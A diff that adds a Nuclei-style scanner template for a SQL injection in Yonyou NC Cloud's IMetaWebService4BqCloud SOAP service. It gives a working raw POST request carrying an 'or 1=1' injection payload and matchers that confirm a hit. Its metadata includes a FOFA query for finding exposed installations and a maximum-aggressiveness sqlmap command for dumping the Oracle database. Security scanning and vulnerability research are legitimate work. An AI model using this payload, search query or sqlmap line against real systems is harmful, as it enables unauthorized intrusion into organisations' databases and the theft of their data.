@@ -1,0 +1,38 @@
+id: yonyou-nc-cloud-IMetaWebService4BqCloud-sqli
+
+info:
+  name: 用友 NC Cloud IMetaWebService4BqCloud - sqli
+  author: leadlife
+  severity: high
+  description:
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: app="用友-NC-Cloud"
+    sqlmap: sqlmap -r sql.txt --random-agent --batch --dbms=Oracle --risk 3 --level 5
+  tags: sqli,yonyou,nccloud,oa
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/uap.pubitf.ae.meta.IMetaWebService4BqCloud HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml;charset=UTF-8
+        Content-Length: 333
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:imet="http://meta.ae.pubitf.uap/IMetaWebService4BqCloud">
+            <soapenv:Header/>
+            <soapenv:Body>
+            <imet:loadFields>
+                <imet:string>SmartModel^1' or 1=1 --</imet:string>
+            </imet:loadFields>
+            </soapenv:Body>
+        </soapenv:Envelope>
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'soap:Envelope','design')
+        condition: and
